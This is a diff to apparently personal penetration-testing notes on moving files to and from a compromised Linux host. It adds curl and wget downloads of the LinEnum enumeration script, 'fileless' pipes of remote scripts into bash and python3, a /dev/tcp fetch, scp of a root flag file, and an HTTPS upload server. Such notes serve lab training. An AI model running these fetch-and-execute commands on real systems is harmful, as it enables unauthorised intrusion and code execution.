@@ -191,4 +191,48 @@ echo -n 'LS0....tLS==' | base64 -d > id_rsa
 md5sum id_rsa
 ```
 
+### Wget & Curl
+
+```bash
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+```
+
+#### Fileless Method
+
+```bash
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+
+### Bash (/dev/tcp)
+
+```bash
+# Connect to the Target Webserver
+exec 3<>/dev/tcp/10.10.10.32/80
+# HTTP GET Request
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+# print
+cat <&3
+```
+
+### SSH
+
+```bash
+sudo systemctl enable ssh && sudo systemctl start ssh
+
+scp plaintext@192.168.49.128:/root/myroot.txt .
+```
+
 ## Upload
+
+
+```bash
+# create cert
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+# create a new dir
+mkdir https && cd https
+uv run --with uploadserver python -m uploadserver 443 --server-certificate ~/server.pem
+```
